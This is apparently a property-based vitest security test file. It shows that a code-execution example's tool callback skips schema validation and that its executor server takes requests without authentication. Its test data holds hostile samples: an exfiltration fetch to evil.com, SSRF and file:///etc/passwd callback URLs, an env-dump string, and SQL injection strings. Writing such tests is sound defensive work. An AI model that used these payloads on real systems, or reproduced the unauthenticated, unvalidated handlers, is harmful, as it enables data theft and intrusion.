/**
 * Property-based tests proving that handleToolCallback passes arbitrary
 * JSON payloads to tool functions without schema validation, and that the
 * Node executor server accepts requests without authentication.
 *
 * Target code:
 *   - examples/codemode/src/executors/node-server-client.ts  (handleToolCallback)
 *   - examples/codemode/node-executor-server.ts              (HTTP handler)
 *
 * These tests inline the relevant functions rather than cross-importing from
 * the examples directory, keeping the test self-contained while faithfully
 * reproducing the exact vulnerable code paths.
 */
import { describe, it, expect, vi } from "vitest";
import * as fc from "fast-check";
import { z } from "zod";

// ---------------------------------------------------------------------------
// Inline reproduction of handleToolCallback (node-server-client.ts:70-117)
// ---------------------------------------------------------------------------

type ToolFns = Record<string, (...args: unknown[]) => Promise<unknown>>;

/**
 * Faithful reproduction of handleToolCallback from
 * examples/codemode/src/executors/node-server-client.ts lines 70-117.
 * The critical path is lines 107-109: JSON.parse(body) → fn(args).
 */
async function handleToolCallback(
  request: Request,
  registry: Map<string, ToolFns>
): Promise<Response> {
  const url = new URL(request.url);
  const parts = url.pathname.split("/").filter(Boolean);
  const execId = parts[2];
  const toolName = parts[3];

  if (!execId || !toolName) {
    return Response.json({ error: "Invalid callback path" }, { status: 400 });
  }

  const fns = registry.get(execId);
  if (!fns) {
    return Response.json(
      { error: `No execution found for id "${execId}"` },
      { status: 404 }
    );
  }

  const fn = fns[toolName];
  if (!fn) {
    return Response.json(
      { error: `Tool "${toolName}" not found` },
      { status: 404 }
    );
  }

  try {
    const body = await request.text();
    const args = body ? JSON.parse(body) : {}; // line 108: no validation
    const result = await fn(args); // line 109: direct call
    return Response.json({ result });
  } catch (err) {
    return Response.json(
      { error: err instanceof Error ? err.message : String(err) },
      { status: 500 }
    );
  }
}

// ---------------------------------------------------------------------------
// Inline reproduction of Node executor server handler (node-executor-server.ts:99-151)
// ---------------------------------------------------------------------------

interface ExecuteRequest {
  code: string;
  callbackUrl: string;
  tools: string[];
}

/**
 * Faithful reproduction of the HTTP handler from
 * examples/codemode/node-executor-server.ts lines 99-151.
 * Converted from node:http to fetch-compatible Request/Response for testability.
 */
async function nodeExecutorHandler(request: Request): Promise<Response> {
  const headers = new Headers();
  headers.set("Access-Control-Allow-Origin", "*"); // line 102
  headers.set("Access-Control-Allow-Methods", "POST, OPTIONS"); // line 103
  headers.set("Access-Control-Allow-Headers", "Content-Type"); // line 104

  if (request.method === "OPTIONS") {
    return new Response(null, { status: 204, headers });
  }

  const url = new URL(request.url);

  if (request.method === "POST" && url.pathname === "/execute") {
    // No authentication check anywhere — line 112
    try {
      const raw = await request.text();
      const body = JSON.parse(raw) as ExecuteRequest;

      if (!body.code || !body.callbackUrl || !Array.isArray(body.tools)) {
        return Response.json(
          { error: "Missing required fields: code, callbackUrl, tools" },
          { status: 400, headers }
        );
      }

      // In production this calls handleExecute which runs vm.createContext.
      // For testing, we just confirm the request was accepted and parsed.
      return Response.json(
        { accepted: true, code: body.code, tools: body.tools },
        { status: 200, headers }
      );
    } catch (err) {
      return Response.json(
        { error: err instanceof Error ? err.message : String(err) },
        { status: 500, headers }
      );
    }
  }

  if (request.method === "GET" && url.pathname === "/health") {
    return Response.json({ status: "ok" }, { status: 200, headers });
  }

  return Response.json({ error: "Not found" }, { status: 404, headers });
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const EXEC_ID = "test-exec-id";
const TOOL_NAME = "createProject";
const BASE_URL = "http://localhost:5173/node-executor-callback/agent";

/** The Zod schema the tool declares (but that is never enforced). */
const projectSchema = z.object({
  name: z.string().min(1),
  description: z.string().optional(),
  status: z.enum(["active", "archived"]).default("active")
});

function makeRegistry(spy: ReturnType<typeof vi.fn>): Map<string, ToolFns> {
  const registry = new Map<string, ToolFns>();
  registry.set(EXEC_ID, { [TOOL_NAME]: spy });
  return registry;
}

function callbackRequest(body: string): Request {
  return new Request(`${BASE_URL}/${EXEC_ID}/${TOOL_NAME}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body
  });
}

// ---------------------------------------------------------------------------
// Tests: handleToolCallback — schema bypass
// ---------------------------------------------------------------------------

describe("handleToolCallback schema bypass — property tests", () => {
  it("any JSON-serializable value reaches the tool function unchanged", async () => {
    await fc.assert(
      fc.asyncProperty(fc.jsonValue(), async (arbitraryValue) => {
        const spy = vi.fn(async (args: unknown) => ({ ok: true, args }));
        const registry = makeRegistry(spy);

        const res = await handleToolCallback(
          callbackRequest(JSON.stringify(arbitraryValue)),
          registry
        );
        const data = (await res.json()) as { result?: unknown; error?: string };

        expect(res.status).toBe(200);
        expect(data.error).toBeUndefined();
        expect(spy).toHaveBeenCalledTimes(1);

        // The raw parsed value reaches the tool — no validation, no transformation
        const received = spy.mock.calls[0][0];
        expect(received).toEqual(JSON.parse(JSON.stringify(arbitraryValue)));
      }),
      { numRuns: 200 }
    );
  });

  it("schema-violating payloads are accepted by callback but rejected by Zod", async () => {
    const schemaViolatingArb = fc.oneof(
      // Wrong type for 'name' (should be string)
      fc.record({
        name: fc.oneof(
          fc.integer(),
          fc.boolean(),
          fc.constant(null),
          fc.array(fc.integer())
        )
      }),
      // Missing required 'name'
      fc.record({ description: fc.string() }),
      // Empty string for name (min length 1)
      fc.constant({ name: "" }),
      // Invalid enum value for status
      fc.record({
        name: fc.string({ minLength: 1 }),
        status: fc.oneof(
          fc.constant("deleted"),
          fc.constant("pending"),
          fc.integer()
        )
      }),
      // Entirely wrong shape
      fc.constant("just a string"),
      fc.integer(),
      fc.constant(null),
      fc.array(fc.jsonValue())
    );

    await fc.assert(
      fc.asyncProperty(schemaViolatingArb, async (payload) => {
        const spy = vi.fn(async (args: unknown) => ({ stored: args }));
        const registry = makeRegistry(spy);

        const res = await handleToolCallback(
          callbackRequest(JSON.stringify(payload)),
          registry
        );
        const data = (await res.json()) as { result?: unknown; error?: string };

        // Callback accepts it — no validation
        expect(res.status).toBe(200);
        expect(data.error).toBeUndefined();
        expect(spy).toHaveBeenCalledTimes(1);

        // But the declared schema would reject it
        const validation = projectSchema.safeParse(payload);
        expect(validation.success).toBe(false);
      }),
      { numRuns: 150 }
    );
  });

  it("extra keys beyond the schema survive to the tool function", async () => {
    const extraKeysArb = fc.record({
      // Valid fields
      name: fc.string({ minLength: 1 }),
      // Injected extras
      isAdmin: fc.boolean(),
      role: fc.constant("superuser"),
      __proto__: fc.jsonValue(),
      sqlPayload: fc.constant("'; DROP TABLE projects; --"),
      nested: fc.dictionary(fc.string(), fc.jsonValue())
    });

    await fc.assert(
      fc.asyncProperty(extraKeysArb, async (payload) => {
        const spy = vi.fn(async (args: unknown) => args);
        const registry = makeRegistry(spy);

        const res = await handleToolCallback(
          callbackRequest(JSON.stringify(payload)),
          registry
        );

        expect(res.status).toBe(200);
        expect(spy).toHaveBeenCalledTimes(1);

        const received = spy.mock.calls[0][0] as Record<string, unknown>;

        // All injected fields pass through — nothing is stripped
        expect(received).toHaveProperty("isAdmin");
        expect(received).toHaveProperty("role");
        expect(received).toHaveProperty("sqlPayload");
        expect(received).toHaveProperty("nested");
      }),
      { numRuns: 100 }
    );
  });

  it("empty body defaults to empty object (no required-field check)", async () => {
    const spy = vi.fn(async (args: unknown) => args);
    const registry = makeRegistry(spy);

    const req = new Request(`${BASE_URL}/${EXEC_ID}/${TOOL_NAME}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: ""
    });

    const res = await handleToolCallback(req, registry);

    expect(res.status).toBe(200);
    expect(spy).toHaveBeenCalledWith({});

    // Schema requires 'name' — empty object violates it
    expect(projectSchema.safeParse({}).success).toBe(false);
  });

  it("non-POST methods are not rejected by the callback handler", async () => {
    // handleToolCallback doesn't check HTTP method at all
    const spy = vi.fn(async (args: unknown) => args);
    const registry = makeRegistry(spy);

    for (const method of ["PUT", "PATCH", "DELETE"]) {
      spy.mockClear();

      const req = new Request(`${BASE_URL}/${EXEC_ID}/${TOOL_NAME}`, {
        method,
        body: JSON.stringify({ name: "test" })
      });

      const res = await handleToolCallback(req, registry);

      // All methods accepted — no method restriction
      expect(res.status).toBe(200);
      expect(spy).toHaveBeenCalledTimes(1);
    }
  });
});

// ---------------------------------------------------------------------------
// Tests: handleToolCallback — no authentication
// ---------------------------------------------------------------------------

describe("handleToolCallback — no authentication", () => {
  it("requests without any auth headers are accepted", async () => {
    await fc.assert(
      fc.asyncProperty(fc.jsonValue(), async (payload) => {
        const spy = vi.fn(async (args: unknown) => ({ ok: true }));
        const registry = makeRegistry(spy);

        // Request with no auth headers at all
        const req = new Request(`${BASE_URL}/${EXEC_ID}/${TOOL_NAME}`, {
          method: "POST",
          body: JSON.stringify(payload)
          // No Authorization, no Cookie, no API key, no session token
        });

        const res = await handleToolCallback(req, registry);

        expect(res.status).toBe(200);
        expect(spy).toHaveBeenCalledTimes(1);
      }),
      { numRuns: 50 }
    );
  });

  it("only the UUID execId gates access — any client that knows it can call tools", async () => {
    const spy = vi.fn(async () => ({ secret: "database_contents" }));
    const registry = makeRegistry(spy);

    // Attacker knows the execId (transmitted in cleartext HTTP)
    const attackerReq = new Request(`${BASE_URL}/${EXEC_ID}/${TOOL_NAME}`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Origin: "https://evil.attacker.com"
        // No legitimate auth — just the guessed/sniffed execId in the URL
      },
      body: JSON.stringify({ name: "attacker-project" })
    });

    const res = await handleToolCallback(attackerReq, registry);

    // Accepted — no origin check, no auth check
    expect(res.status).toBe(200);
    expect(spy).toHaveBeenCalledTimes(1);

    const data = (await res.json()) as { result: { secret: string } };
    expect(data.result.secret).toBe("database_contents");
  });
});

// ---------------------------------------------------------------------------
// Tests: Node executor server — no authentication
// ---------------------------------------------------------------------------

describe("Node executor server — no authentication", () => {
  it("any origin is allowed via CORS wildcard", async () => {
    const originsArb = fc.oneof(
      fc.constant("https://evil.com"),
      fc.constant("http://localhost:9999"),
      fc.constant("null"),
      fc.webUrl()
    );

    await fc.assert(
      fc.asyncProperty(originsArb, async (origin) => {
        const req = new Request("http://localhost:3001/execute", {
          method: "OPTIONS",
          headers: { Origin: origin }
        });

        const res = await nodeExecutorHandler(req);

        expect(res.status).toBe(204);
        expect(res.headers.get("Access-Control-Allow-Origin")).toBe("*");
        expect(res.headers.get("Access-Control-Allow-Methods")).toContain(
          "POST"
        );
      }),
      { numRuns: 20 }
    );
  });

  it("POST /execute accepts arbitrary code without authentication", async () => {
    const codeArb = fc.oneof(
      fc.constant("async () => { return 42; }"),
      fc.constant(
        "async () => { const r = await fetch('https://evil.com/exfil?data=' + JSON.stringify(await codemode.listProjects({}))); }"
      ),
      fc.constant(
        "async () => { while(true) {} }" // DoS
      ),
      fc.constant(
        "async () => { return process.env; }" // env exfil attempt
      ),
      // Arbitrary non-empty strings (server rejects empty code as missing field, not as auth)
      fc.string({ minLength: 1 })
    );

    const toolsArb = fc.array(fc.string({ minLength: 1, maxLength: 30 }), {
      minLength: 1,
      maxLength: 5
    });

    await fc.assert(
      fc.asyncProperty(codeArb, toolsArb, async (code, tools) => {
        const req = new Request("http://localhost:3001/execute", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          // No Authorization header, no API key, no session token
          body: JSON.stringify({
            code,
            callbackUrl: "http://attacker.com/steal",
            tools
          })
        });

        const res = await nodeExecutorHandler(req);

        // Server accepts the request — no auth check
        expect(res.status).toBe(200);

        const data = (await res.json()) as {
          accepted: boolean;
          code: string;
          tools: string[];
        };
        expect(data.accepted).toBe(true);
        expect(data.code).toBe(code);

        // The attacker-controlled callbackUrl is accepted — tools will POST
        // results to attacker.com instead of the legitimate callback
      }),
      { numRuns: 50 }
    );
  });

  it("attacker-controlled callbackUrl is accepted without validation", async () => {
    const maliciousCallbackArb = fc.oneof(
      fc.constant("http://attacker.com/steal"),
      fc.constant("http://169.254.169.254/latest/meta-data/"), // SSRF
      fc.constant("http://localhost:6379/"), // Redis
      fc.constant("file:///etc/passwd"),
      fc.webUrl()
    );

    await fc.assert(
      fc.asyncProperty(maliciousCallbackArb, async (callbackUrl) => {
        const req = new Request("http://localhost:3001/execute", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            code: "async () => { await codemode.getTool({}); }",
            callbackUrl,
            tools: ["getTool"]
          })
        });

        const res = await nodeExecutorHandler(req);

        // Accepted regardless of callbackUrl value
        expect(res.status).toBe(200);
      }),
      { numRuns: 20 }
    );
  });

  it("demonstrates the gap: 100% of requests accepted without auth", async () => {
    let accepted = 0;
    const total = 100;

    await fc.assert(
      fc.asyncProperty(
        fc.string({ minLength: 1 }),
        fc.array(fc.string({ minLength: 1 }), { minLength: 1, maxLength: 3 }),
        async (code, tools) => {
          const req = new Request("http://localhost:3001/execute", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              code,
              callbackUrl: "http://attacker.com/callback",
              tools
            })
          });

          const res = await nodeExecutorHandler(req);

          if (res.status === 200) {
            accepted++;
          }
        }
      ),
      { numRuns: total }
    );

    // Every single request is accepted — zero authentication
    expect(accepted).toBe(total);
  });
});

// ---------------------------------------------------------------------------
// Tests: Combined attack chain
// ---------------------------------------------------------------------------

describe("combined attack: callback bypass + schema bypass", () => {
  it("attacker can invoke any registered tool with arbitrary args via HTTP", async () => {
    // Simulate what an attacker does after sniffing the cleartext callback URL
    const attackPayloadArb = fc.record({
      // Fields that violate every constraint in projectSchema
      name: fc.oneof(fc.integer(), fc.constant(null), fc.constant("")),
      status: fc.constant("hacked"),
      isAdmin: fc.constant(true),
      deleteAll: fc.constant(true),
      sqlInjection: fc.constant("' OR 1=1; DROP TABLE projects; --")
    });

    await fc.assert(
      fc.asyncProperty(attackPayloadArb, async (payload) => {
        const receivedArgs: unknown[] = [];
        const spy = vi.fn(async (args: unknown) => {
          receivedArgs.push(args);
          return { success: true };
        });
        const registry = makeRegistry(spy);

        // Step 1: Attacker sends POST directly to callback URL (no auth needed)
        const req = new Request(`${BASE_URL}/${EXEC_ID}/${TOOL_NAME}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Origin: "https://evil.attacker.com"
          },
          body: JSON.stringify(payload)
        });

        // Step 2: handleToolCallback accepts — no auth, no schema validation
        const res = await handleToolCallback(req, registry);

        expect(res.status).toBe(200);
        expect(spy).toHaveBeenCalledTimes(1);

        // Step 3: The tool function receives the attacker's exact payload
        const received = receivedArgs[0] as Record<string, unknown>;
        expect(received).toEqual(JSON.parse(JSON.stringify(payload)));

        // Step 4: Schema would have rejected this
        expect(projectSchema.safeParse(payload).success).toBe(false);

        // Step 5: But the attacker's payload reached the tool unchanged
        expect(received).toHaveProperty("isAdmin", true);
        expect(received).toHaveProperty("deleteAll", true);
        expect(received).toHaveProperty("sqlInjection");
      }),
      { numRuns: 100 }
    );
  });
});
